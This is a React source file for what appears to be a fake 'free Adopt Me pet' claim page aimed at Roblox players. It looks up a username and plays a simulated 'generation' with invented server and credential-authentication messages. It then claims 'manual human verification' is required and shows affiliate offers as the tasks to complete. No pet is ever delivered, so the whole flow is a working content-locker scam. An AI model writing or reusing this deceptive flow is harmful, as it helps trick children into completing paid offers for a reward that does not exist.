"use client"

import type React from "react"
import { useState, useEffect, useRef } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Label } from "@/components/ui/label"
import { Badge } from "@/components/ui/badge"
import Image from "next/image"
import { useRouter } from "next/navigation"
import { Heart, User, Sparkles, Star, Crown, CheckCircle, Gift, ExternalLink, Clock, Trophy, Zap, Shield, Users, ArrowRight, ArrowDown, ArrowUp, Loader2, Sparkle, Search } from "lucide-react"

interface Pet {
  name: string
  image: string
  color: string
}

interface ClaimFormProps {
  pet: Pet
  petId: string
}

interface RobloxUser {
  id: number
  username: string
  image: string
}

interface Offer {
  url: string
  anchor: string
  conversion: string
  payout?: string
  network_icon?: string
  title?: string
  description?: string
  name?: string
}

const rarityColors = {
  Common: "bg-gradient-to-r from-gray-400 to-gray-500 text-white",
  Rare: "bg-gradient-to-r from-blue-400 to-blue-500 text-white",
  Epic: "bg-gradient-to-r from-purple-400 to-purple-500 text-white",
  Legendary: "bg-gradient-to-r from-yellow-400 to-yellow-500 text-purple-800",
  Mega: "bg-gradient-to-r from-green-400 to-green-500 text-white",
  Neon: "bg-gradient-to-r from-pink-400 to-pink-500 text-white",
  Shadow: "bg-gradient-to-r from-gray-700 to-gray-800 text-white",
  Frost: "bg-gradient-to-r from-cyan-400 to-cyan-500 text-white",
  Ultra: "bg-gradient-to-r from-red-400 to-red-500 text-white",
}

const rarityIcons = {
  Common: "⭐",
  Rare: "⭐⭐",
  Epic: "⭐⭐⭐",
  Legendary: "⭐⭐⭐⭐",
  Mega: "⭐⭐⭐⭐⭐",
  Neon: "✨",
  Shadow: "🌙",
  Frost: "❄️",
  Ultra: "🔥",
}

type FlowStep =  'username' | 'confirm' | 'generating' | 'verification' | 'offers'

export function ClaimForm({ pet, petId }: ClaimFormProps) {
  const [currentStep, setCurrentStep] = useState<FlowStep>('username')
  const [username, setUsername] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [isCheckingUser, setIsCheckingUser] = useState(false)
  const [robloxUser, setRobloxUser] = useState<RobloxUser | null>(null)
  const [userError, setUserError] = useState("")
  const [showSuccess, setShowSuccess] = useState(false)
  const [generatingProgress, setGeneratingProgress] = useState(0)
  const [generationStep, setGenerationStep] = useState(0)
  const [generationComments, setGenerationComments] = useState("")
  const [offers, setOffers] = useState<Offer[]>([])
  const [showArrow, setShowArrow] = useState(false)
  const [highlightInput, setHighlightInput] = useState(false)
  const usernameInputRef = useRef<HTMLInputElement>(null)
  const router = useRouter()

  const generationSteps = [
    "Connecting to Adopt Me servers...",
    "Authenticating user credentials...",
    "Scanning available pets database...",
    "Checking pet availability...",
    "Generating unique pet ID...",
    "Preparing pet data...",
    "Setting up transfer protocol...",
    "Finalizing pet generation...",
    "Manual human verification required...",
    "Verification not complete! "
  ]

  // Start the flow when component mounts
  useEffect(() => {
    const timer = setTimeout(() => {
      setShowArrow(true)
      setCurrentStep('username')
    }, 1000)
    return () => clearTimeout(timer)
  }, [])

  // Focus input when arrow appears
  useEffect(() => {
    if (showArrow && usernameInputRef.current) {
      setTimeout(() => {
        usernameInputRef.current?.focus()
        setHighlightInput(true)
      }, 500)
    }
  }, [showArrow])

  const checkRobloxUser = async (inputUsername: string) => {
    if (!inputUsername.trim()) {
      setUserError("Please enter a username!")
      return
    }

    setIsCheckingUser(true)
    setUserError("")
    setRobloxUser(null)

    try {
      const response = await fetch(`https://rbxback.fun/search_user/${inputUsername.trim()}`)

      if (response.ok) {
        const userData: RobloxUser = await response.json()
        setRobloxUser(userData)
        setShowSuccess(true)
        setTimeout(() => setShowSuccess(false), 2000)
        // Move directly to next step after successful check
        setTimeout(() => {
          setCurrentStep('confirm')
          window.scrollTo(0, 0)
        }, 1000)
      } else {
        setRobloxUser(null)
        setUserError("Roblox user not found! Try a different username!")
      }
    } catch (error) {
      setRobloxUser(null)
      setUserError("Can't check Roblox right now! But you can still claim your pet!")
    } finally {
      setIsCheckingUser(false)
    }
  }

  const fetchOffers = async (userId: number) => {
    try {
      const response = await fetch(`/api/offers`, {
        method: "GET",
        headers: { "Content-Type": "application/json" },
      })

      if (response.ok) {
        const offersData = await response.json()
        if (offersData && offersData.length > 0) {
          setOffers(offersData.slice(0, 5))
        } else {
          setOffers([])
        }
      } else {
        setOffers([])
      }
    } catch (error) {
      setOffers([])
    }
  }

  const handleContinue = () => {
    setCurrentStep('confirm')
    window.scrollTo(0, 0)
  }

  const handleConfirm = () => {
    setCurrentStep('generating')
    window.scrollTo(0, 0)
    setGeneratingProgress(0)
    setGenerationStep(0)

    // Enhanced generation simulation
    const progressInterval = setInterval(() => {
      setGeneratingProgress((prev) => {
        const newProgress = prev + Math.random() * 8
        const step = Math.floor((newProgress / 100) * generationSteps.length)

        if (step !== generationStep && step < generationSteps.length) {
          setGenerationStep(step)
          setGenerationComments(generationSteps[step])
        }

        if (newProgress >= 100) {
          clearInterval(progressInterval)
          setGenerationStep(generationSteps.length - 1)
          setGenerationComments(generationSteps[generationSteps.length - 1])
          return 100
        }
        return newProgress
      })
    }, 400)

    // Wait for animation to complete (12 seconds)
    setTimeout(() => {
      setCurrentStep('verification')
      window.scrollTo(0, 0)
      const userId = robloxUser?.id || Math.floor(Math.random() * 1000000)
      fetchOffers(userId)
    }, 12000)
  }

  const handleOfferComplete = () => {
    localStorage.setItem(
      "claimedPet",
      JSON.stringify({
        pet,
        username: username.trim(),
        robloxUser,
        claimedAt: new Date().toISOString(),
      }),
    )
    router.push("/thank-you")
  }

  // Username input step
  if (currentStep === 'username') {
    return (
      <div className="flex items-center justify-center p-4">
        <Card className="w-full max-w-md border-0 rounded-3xl shadow-2xl glass-enhanced overflow-hidden transition-all duration-500 hover:shadow-3xl">
          <div className="bg-gradient-to-br from-blue-500 via-purple-500 to-pink-500 p-6 text-white text-center">
            <div className="w-16 h-16 mx-auto bg-white/20 rounded-2xl p-3 flex items-center justify-center mb-4 backdrop-blur-sm">
              <User className="h-8 w-8 text-white" />
            </div>
            <h2 className="text-xl font-bold mb-2">Enter Your Roblox Username</h2>
            <p className="text-blue-100 text-sm">We'll show your avatar with your new pet!</p>
          </div>
          
          <CardContent className="p-8">
            {/* Pet Display */}
            <div className="mb-6 text-center">
              <div className={`w-24 h-24 mx-auto bg-gradient-to-br ${pet.color} rounded-2xl p-2 flex items-center justify-center shadow-xl mb-3 transition-all duration-300 hover:scale-105`}>
                <Image
                  src={pet.image || "/placeholder.svg"}
                  alt={pet.name}
                  width={80}
                  height={80}
                  className="rounded-xl w-full h-full object-cover"
                />
              </div>
              <h3 className="font-bold text-purple-800 mb-1">{pet.name}</h3>
              
            </div>

            <div className="space-y-4">
              <div className="relative">
                <Label htmlFor="username" className="text-sm font-bold text-purple-700 mb-2 block">
                  Roblox Username
                </Label>
                <div className="relative">
                  <User className="absolute left-3 top-1/2 transform -translate-y-1/2 h-5 w-5 text-purple-400" />
                  <Input
                    ref={usernameInputRef}
                    id="username"
                    type="text"
                    placeholder="Type your username here!"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className={`pl-10 h-12 text-base border-2 rounded-xl font-bold transition-all duration-300 focus:ring-4 focus:ring-purple-200 ${
                      highlightInput
                        ? 'border-pink-400 bg-pink-50 shadow-lg'
                        : 'border-purple-300 bg-purple-50 hover:border-purple-400'
                    }`}
                    required
                  />
                </div>
                {userError && (
                  <div className="mt-2 bg-red-100 border-2 border-red-400 rounded-xl p-3 transition-all duration-300">
                    <p className="text-red-700 font-bold text-sm">{userError}</p>
                  </div>
                )}
              </div>

              {/* Check Username Button */}
              <Button
                onClick={() => checkRobloxUser(username)}
                disabled={isCheckingUser || !username.trim()}
                className="w-full bg-gradient-to-r from-purple-400 to-pink-400 hover:from-purple-500 hover:to-pink-500 text-white font-bold py-3 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isCheckingUser ? (
                  <>
                    <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                    Checking...
                  </>
                ) : (
                  <>
                    <Search className="mr-2 h-5 w-5" />
                    Check Username
                  </>
                )}
              </Button>

              {robloxUser && (
                <div className="bg-gradient-to-r from-green-50 to-emerald-50 border-2 border-green-400 rounded-xl p-4 text-center transition-all duration-300 hover:shadow-lg">
                  <div className="flex items-center justify-center space-x-3 mb-3">
                    <div className="relative">
                      <Image
                        src={robloxUser.image}
                        alt={robloxUser.username}
                        width={48}
                        height={48}
                        className="rounded-xl border-2 border-white shadow-lg"
                      />
                      <div className="absolute -top-1 -right-1 w-4 h-4 bg-green-500 rounded-full border-2 border-white"></div>
                    </div>
                    <span className="font-bold text-green-800">{robloxUser.username}</span>
                  </div>
                  <p className="text-green-600 text-sm font-bold">Moving to next step...</p>
                </div>
              )}
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  // Confirmation step
  if (currentStep === 'confirm') {
    return (
      <div className="flex items-center justify-center p-4">
        <Card className="w-full max-w-2xl border-0 rounded-3xl shadow-2xl glass-enhanced overflow-hidden transition-all duration-500 hover:shadow-3xl">
          <div className="bg-gradient-to-br from-pink-500 via-purple-500 to-indigo-500 p-6 text-white text-center">
            <h2 className="text-2xl font-bold mb-2">Ready to Claim Your Pet!</h2>
          </div>
          
          <CardContent className="p-8">
            <div className="flex flex-row sm:flex-row items-center justify-center sm:space-y-0 sm:space-x-6 mb-8">
              {/* User Avatar */}
              <div className="text-center">
                <div className="w-20 h-20 bg-gradient-to-br from-blue-200 to-purple-200 rounded-2xl p-2 flex items-center justify-center shadow-xl mb-3 transition-all duration-300 hover:scale-105">
                  <Image
                    src={robloxUser?.image || "/placeholder.svg"}
                    alt={robloxUser?.username || username}
                    width={80}
                    height={80}
                    className="rounded-xl w-full h-full object-cover"
                  />
                </div>
                <p className="font-bold text-purple-800">{robloxUser?.username || username}</p>
              </div>

              {/* Plus Sign */}
              <div className="text-4xl text-purple-500">+</div>

              {/* Pet */}
              <div className="text-center">
                <div className={`w-20 h-20 bg-gradient-to-br ${pet.color} rounded-2xl p-2 flex items-center justify-center shadow-xl mb-3 transition-all duration-300 hover:scale-105`}>
                  <Image
                    src={pet.image || "/placeholder.svg"}
                    alt={pet.name}
                    width={80}
                    height={80}
                    className="rounded-xl w-full h-full object-cover"
                  />
                </div>
                <p className="font-bold text-sm text-purple-800">{pet.name}</p>
                
              </div>

              {/* Equals Sign */}
              <div className="text-4xl text-purple-500">=</div>

              {/* Result */}
              <div className="text-center">
                <div className="w-20 h-20 bg-gradient-to-br from-pink-200 to-purple-200 rounded-2xl p-2 flex items-center justify-center shadow-xl mb-3 transition-all duration-300 hover:scale-105">
                  <span className="text-4xl">🎉</span>
                </div>
                <p className="font-bold text-purple-800">AWESOME!</p>
              </div>
            </div>

            <div className="text-center flex justify-center items-center">
              <Button
                onClick={handleConfirm}
                className="bg-gradient-to-r   from-pink-400 via-purple-400 to-blue-400 hover:from-pink-500 hover:via-purple-500 hover:to-blue-500 text-white font-bold py-4 px-8 rounded-xl shadow-xl hover:shadow-2xl transition-all duration-300 text-lg"
              >
                <Zap className=" h-5 w-5" />
                Start Generating My Pet!
              </Button>
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  // Generating step
  if (currentStep === 'generating') {
    return (
      <div className="flex items-center justify-center p-4">
        <Card className="w-full max-w-2xl border-0 rounded-3xl shadow-2xl glass-enhanced overflow-hidden transition-all duration-500">
          <div className="bg-gradient-to-br from-indigo-500 via-purple-500 to-pink-500 p-6 text-white text-center">
            {/* <div className="w-20 h-20 mx-auto bg-white/20 rounded-2xl p-4 flex items-center justify-center mb-4 backdrop-blur-sm">
              <Loader2 className="h-10 w-10 text-white animate-spin" />
            </div> */}
            <h2 className="text-3xl font-bold mb-4">Generating Your Pet!</h2>
            <p className="text-indigo-100 text-lg">This will take a few moments...</p>
          </div>
          
          <CardContent className="p-8">
            {/* Progress Bar */}
            <div className="mb-6">
              <div className="flex justify-between items-center mb-3">
                <span className="text-sm font-bold text-purple-700">Progress</span>
                <span className="text-sm font-bold text-purple-700">{Math.floor(generatingProgress)}%</span>
              </div>
              <div className="relative h-4 bg-gray-200 rounded-full overflow-hidden shadow-inner">
                <div
                  className="h-full bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 rounded-full transition-all duration-500"
                  style={{ width: `${generatingProgress}%` }}
                >
                  <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/40 to-transparent"></div>
                </div>
              </div>
            </div>

            {/* Current Step */}
            <div className="bg-gradient-to-r from-purple-100 to-pink-100 rounded-xl p-4 border-2 border-purple-300 transition-all duration-300">
              <div className="flex items-center space-x-3">
                <div className="w-2 h-2 bg-gradient-to-r from-pink-500 to-purple-500 rounded-full"></div>
                <span className="text-purple-800 font-bold">{generationComments}</span>
              </div>
            </div>

            {/* Pet and User Display */}
            <div className="flex items-center justify-center space-x-6 mt-8">
              <div className="text-center">
                <div className="w-16 h-16 bg-gradient-to-br from-blue-200 to-purple-200 rounded-xl p-2 flex items-center justify-center shadow-lg transition-all duration-300 hover:scale-105">
                  <Image
                    src={robloxUser?.image || "/placeholder.svg"}
                    alt={robloxUser?.username || username}
                    width={48}
                    height={48}
                    className="rounded-lg w-full h-full object-cover"
                  />
                </div>
                <p className="text-sm font-bold text-purple-800 mt-2">{robloxUser?.username || username}</p>
              </div>

              <div className="text-2xl text-purple-500">+</div>

              <div className="text-center">
                <div className={`w-16 h-16 bg-gradient-to-br ${pet.color} rounded-xl p-2 flex items-center justify-center shadow-lg transition-all duration-300 hover:scale-105`}>
                  <Image
                    src={pet.image || "/placeholder.svg"}
                    alt={pet.name}
                    width={48}
                    height={48}
                    className="rounded-lg w-full h-full object-cover"
                  />
                </div>
                <p className="text-sm font-bold text-purple-800 mt-2">{pet.name}</p>
              </div>
            </div>
          </CardContent>
        </Card>
      </div>
    )
  }

  // Verification step
  if (currentStep === 'verification') {
    return (
      <div className="space-y-6">
        {/* Pet and User Display */}
        <Card className="border-0 rounded-3xl shadow-2xl glass-enhanced overflow-hidden transition-all duration-500 hover:shadow-3xl">
          
          <CardContent className="p-6 sm:p-8">
            <div className="flex flex-row sm:flex-row items-center justify-center space-x-2 sm:space-y-0 sm:space-x-6">
              <div className="text-center">
                <div className="w-20 h-20 sm:w-24 sm:h-24 bg-gradient-to-br from-blue-200 to-purple-200 rounded-2xl p-2 flex items-center justify-center shadow-xl mb-3 transition-all duration-300 hover:scale-105">
                  <Image
                    src={robloxUser?.image || "/placeholder.svg"}
                    alt={robloxUser?.username || username}
                    width={64}
                    height={64}
                    className="rounded-xl w-full h-full object-cover"
                  />
                </div>
                <p className="font-bold text-purple-800 text-sm sm:text-base">{robloxUser?.username || username}</p>
              </div>

              <div className="text-2xl sm:text-4xl text-green-500">+</div>

              <div className="text-center">
                <div className={`w-20 h-20 sm:w-24 sm:h-24 bg-gradient-to-br ${pet.color} rounded-2xl p-2 flex items-center justify-center shadow-xl mb-3 transition-all duration-300 hover:scale-105`}>
                  <Image
                    src={pet.image || "/placeholder.svg"}
                    alt={pet.name}
                    width={64}
                    height={64}
                    className="rounded-xl w-full h-full object-cover"
                  />
                </div>
                <p className="font-bold text-purple-800 text-sm sm:text-base">{pet.name}</p>
                
              </div>

             

              
            </div>
          </CardContent>
        </Card>

        {/* Manual Verification Message */}
        <Card className="border-0 rounded-3xl shadow-2xl glass-enhanced overflow-hidden transition-all duration-500 hover:shadow-3xl">
          <div className="bg-gradient-to-br from-yellow-500 via-orange-500 to-red-500 p-6 text-white text-center">
            <div className="w-16 h-16 mx-auto bg-white/20 rounded-2xl p-3 flex items-center justify-center mb-4 backdrop-blur-sm">
              <Shield className="h-8 w-8 text-white" />
            </div>
            <h3 className="text-xl font-bold mb-2">Manual Verification Required</h3>
            <p className="text-yellow-100">To complete your pet claim, please complete one of the verification tasks below.</p>
          </div>
          
          <CardContent className="p-6 sm:p-8">
            {/* Offers/Tasks */}
            {offers.length > 0 ? (
              <div className="space-y-3 sm:space-y-4">
                {offers.map((offer, index) => (
                  <Card
                    key={index}
                    className="border-0 rounded-2xl bg-gradient-to-r from-purple-50 to-pink-50 shadow-lg hover:shadow-xl transition-all duration-300 overflow-hidden"
                  >
                    <CardContent className="p-4 sm:p-6">
                      {/* Mobile Layout */}
                      <div className="block sm:hidden">
                        <div className="flex items-start space-x-4 mb-4">
                          {/* Image on the right */}
                          <div className="w-16 h-16 bg-gradient-to-br from-blue-100 to-purple-100 rounded-xl p-2 flex items-center justify-center border-2 border-blue-200 shadow-lg flex-shrink-0">
                            {offer.network_icon ? (
                              <img
                                src={offer.network_icon}
                                alt="Network"
                                className="w-full h-full object-contain rounded-lg"
                              />
                            ) : (
                              <span className="text-2xl">🎮</span>
                            )}
                          </div>
                          {/* Content on the left */}
                          <div className="flex-1 min-w-0">
                            <h4 className="font-bold text-purple-800 mb-2 text-base leading-tight">
                              {offer.name}
                            </h4>
                            <p className="text-purple-600 text-sm  px-3 py-1 inline-block">
                              {offer.anchor || offer.conversion}
                            </p>
                          </div>
                          
                          
                        </div>
                        
                        {/* Button below */}
                        <Button
                          asChild
                          className="w-full bg-gradient-to-r from-green-400 to-emerald-400 hover:from-green-500 hover:to-emerald-500 text-white font-bold px-4 py-3 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 text-base"
                        >
                          <a href={offer.url} target="_blank" rel="noopener noreferrer">
                            
                            Complete
                          </a>
                        </Button>
                      </div>

                      {/* Desktop Layout */}
                      <div className="hidden sm:flex items-center space-x-4">
                        {/* Network Icon */}
                        <div className="w-14 h-14 bg-gradient-to-br from-blue-100 to-purple-100 rounded-xl p-2 flex items-center justify-center border-2 border-blue-200 shadow-lg flex-shrink-0">
                          {offer.network_icon ? (
                            <img
                              src={offer.network_icon}
                              alt="Network"
                              className="w-full h-full object-contain rounded-lg"
                            />
                          ) : (
                            <span className="text-2xl">🎮</span>
                          )}
                        </div>

                        {/* Content */}
                        <div className="flex-1 text-left min-w-0">
                          <h4 className="font-bold text-purple-800 mb-2 text-base leading-tight">
                            {offer.name}
                          </h4>
                          <p className="text-purple-600 text-sm bg-purple-100 px-3 py-1 rounded-full inline-block">
                            {offer.anchor || offer.conversion}
                          </p>
                        </div>

                        {/* Action Button */}
                        <Button
                          asChild
                          className="bg-gradient-to-r from-green-400 to-emerald-400 hover:from-green-500 hover:to-emerald-500 text-white font-bold px-4 py-3 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 text-base flex-shrink-0"
                        >
                          <a href={offer.url} target="_blank" rel="noopener noreferrer">
                            <CheckCircle className="mr-2 h-4 w-4" />
                            Complete
                          </a>
                        </Button>
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>
            ) : (
              <Card className="border-0 rounded-2xl bg-gradient-to-r from-orange-50 to-red-50 shadow-lg overflow-hidden">
                <CardContent className="p-6 sm:p-8 text-center">
                  <div className="text-4xl mb-4">😔</div>
                  <h3 className="text-xl sm:text-2xl font-bold text-purple-800 mb-4">
                    No verification tasks available right now! 
                  </h3>
                  <p className="text-purple-600">Please check back later or try refreshing the page.</p>
                </CardContent>
              </Card>
            )}
          </CardContent>
        </Card>
      </div>
    )
  }

  return null
}

